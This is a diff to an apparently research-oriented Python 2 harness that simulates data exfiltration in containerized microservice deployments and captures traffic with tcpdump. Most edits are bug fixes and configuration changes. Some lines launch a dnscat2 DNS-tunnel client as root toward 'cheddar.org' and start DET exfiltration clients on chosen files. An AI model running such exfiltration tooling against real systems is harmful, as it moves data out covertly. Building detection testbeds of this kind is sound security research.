@@ -188,7 +188,10 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
     # start the endpoint (assuming the pre-reqs are installed prior to the running of this script)
     # todo: modify this for the k8s scaneario
     # todo: modify for 1-n, n-1, n-n
-    print "ex", exfil_path[0], proxy_instance_to_networks_to_ip[ selected_proxies[exfil_path[0]][0] ]
+    try:
+        print "ex", exfil_path[0], proxy_instance_to_networks_to_ip[ selected_proxies[exfil_path[0]][0] ]
+    except:
+        pass
     srcs = []
     if orchestrator == "docker_swarm":
         for proxy_instance in selected_proxies[exfil_path[0]]:
@@ -316,11 +319,11 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
             print "about to tcpdump on:", current_network_name
             filename = experiment_name + '_' + current_network_name + '_' + str(i)
             if orchestrator == 'docker_swarm':
-                thread.start_new_thread(start_tcpdump, (None, network_namespace, str(int(experiment_length)), filename + '.pcap'))
+                thread.start_new_thread(start_tcpdump, (None, network_namespace, str(int(experiment_length)), filename + '.pcap', orchestrator))
             elif orchestrator == 'kubernetes':
                 interfaces = ['any'] #['docker0', 'eth0', 'eth1']
                 for interface in interfaces:
-                    thread.start_new_thread(start_tcpdump, (interface, network_namespace, str(int(experiment_length)), filename + interface + '.pcap'))
+                    thread.start_new_thread(start_tcpdump, (interface, network_namespace, str(int(experiment_length)), filename + interface + '.pcap', orchestrator))
             else:
                 pass
 
@@ -345,7 +348,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                     if exfil_method == 'DET':
                         thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocol, container))
                     elif exfil_method == 'dnscat':
-                        thread.start_new_thread(start_dnscat_client(), (container))
+                        thread.start_new_thread(start_dnscat_client, (container))
                     else:
                         print "that exfiltration method was not recognized!"
 
@@ -358,7 +361,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                     if exfil_method == 'DET':
                         stop_det_client(container)
                     elif exfil_method == 'dnscat':
-                        start_dnscat_client()
+                        stop_dnscat_client(container)
                     else:
                         print "that exfiltration method was not recognized!"
 
@@ -391,12 +394,13 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
             subprocess.call(['truncate', '-s', '0' ,'./' + experiment_name + '_det_server_local_output.txt'])
 
         #''' # enable if you are using cilium as the network plugin
-        cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
+        if network_plugin == 'cilium':
+            cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
                                 "-o", "json"]
-        out = subprocess.check_output(cilium_endpoint_args)
-        container_config_file = experiment_name + '_' + str(i) + '_cilium_network_configs.txt'
-        with open(container_config_file, 'w') as f:
-            f.write(out)
+            out = subprocess.check_output(cilium_endpoint_args)
+            container_config_file = experiment_name + '_' + str(i) + '_cilium_network_configs.txt'
+            with open(container_config_file, 'w') as f:
+                f.write(out)
         #'''
 
     # stopping the proxies can be done the same way (useful if e.g., switching
@@ -415,7 +419,7 @@ def prepare_app(app_name, config_params, ip, port):
         print request_url
         prepare_cmds = ["locust", "-f", "./sockshop_config/pop_db.py", request_url, "--no-web", "-c",
              config_params["number_background_locusts"], "-r", config_params["background_locust_spawn_rate"],
-             "-n", config_params["number_customer_records"]]
+             "-t", "10min"]
         print prepare_cmds
         out = subprocess.check_output(prepare_cmds)
 
@@ -551,10 +555,7 @@ def get_IP(orchestrator):
     return "-1"
 
 
-# note this may need to be impflemented as a seperate thread
-# in which case it'll also need experimental time + will not need
-# to reset the bash situation
-def start_tcpdump(interface, network_namespace, tcpdump_time, filename):
+def start_tcpdump(interface, network_namespace, tcpdump_time, filename, orchestrator):
     #if orchestrator == "kubernetes":
     #    pass
     #elif orchestrator == "docker_swarm":
@@ -567,7 +568,8 @@ def start_tcpdump(interface, network_namespace, tcpdump_time, filename):
     #args = ['docker-machine', 'ssh', 'default', '-t', "sudo ls /var/run/docker/netns"]
 
     start_netshoot = "docker run -it --rm -v /var/run/docker/netns:/var/run/docker/netns -v /home/docker:/outside --privileged=true nicolaka/netshoot"
-    tcpdump_time = str(int(tcpdump_time) / 5) # dividing by 5 b/c going to rotate
+    #tcpdump_time = str(int(tcpdump_time) / 5) # dividing by 5 b/c going to rotate
+    #tcpdump_time = str(int(tcpdump_time) / 10) # dividing by 10 b/c going to rotate
     print network_namespace, tcpdump_time
     switch_namespace =  'nsenter --net=/var/run/docker/netns/' + network_namespace + ' ' 'sh'
 
@@ -583,8 +585,12 @@ def start_tcpdump(interface, network_namespace, tcpdump_time, filename):
             # this is stuff that arrives on the routing mesh
         else:
             interface = "br0"
-    start_tcpdum = "tcpdump -G " + tcpdump_time + ' -W 5 -i ' + interface + ' -w /outside/\'' + filename \
-                   + '_%Y-%m-%d_%H:%M:%S.pcap\''+ ' -n' + ' -z gzip '
+    # TODO: re-enable if you want rotation and compression!
+    #tcpdump_time = str(int(tcpdump_time) / 10) # dividing by 10 b/c going to rotate
+    #start_tcpdum = "tcpdump -G " + tcpdump_time + ' -W 10 -i ' + interface + ' -w /outside/\'' + filename \
+    #               + '_%Y-%m-%d_%H:%M:%S.pcap\''+ ' -n' + ' -z gzip '
+    start_tcpdum = "tcpdump -G " + tcpdump_time + ' -W 1 -i ' + interface + ' -w /outside/' + filename + ' -n'
+
     cmd_to_send = start_netshoot + ';' + switch_namespace + ';' + start_tcpdum
     print "cmd_to_send", cmd_to_send
     print "start_netshoot", start_netshoot
@@ -716,8 +722,9 @@ def map_container_instances_to_ips(orchestrator, class_to_instances, class_to_ne
     print "class_to_instance_names", class_to_instances.keys()
     print class_to_instances
     ice = 0
-    pod_to_ip = get_cilium_mapping()
-    print "pod to ip", pod_to_ip
+    if network_plugin =='cilium':
+        pod_to_ip = get_cilium_mapping()
+        print "pod to ip", pod_to_ip
     for class_name, containers in class_to_instances.iteritems():
         print 'class_to_networks[class_name]', class_to_networks[class_name], class_name,  class_to_networks
         for container in containers:
@@ -1077,7 +1084,7 @@ def setup_config_file_det_client(dst, container, directory_to_exfil, regex_to_ex
     #print next( file_to_exfil.output )
     return file_to_exfil
 
-def start_dnscat_client():
+def start_dnscat_client(container):
     cmds = ['/dnscat2/client/dnscat', 'cheddar.org']
     print "start dns exfil commands", str(cmds)
     out = container.exec_run(cmds, user="root", workdir='/dnscat2/client/', stdout=True)
@@ -1260,7 +1267,8 @@ if __name__=="__main__":
         # note: this assumes that minikube is deployed on my laptop (as opposed to on the cloud)
 	#path_to_docker_machine_tls_certs = "/Users/jseverin/.minikube/certs"
     	# note: the below is for cloudlab
-	path_to_docker_machine_tls_certs = "/users/jsev/.minikube/certs"
+	#path_to_docker_machine_tls_certs = "/users/jsev/.minikube/certs"
+        path_to_docker_machine_tls_certs = "/mydata/.minikube/certs"
     else:
         print "orchestrator not recognized"
         exit(11)
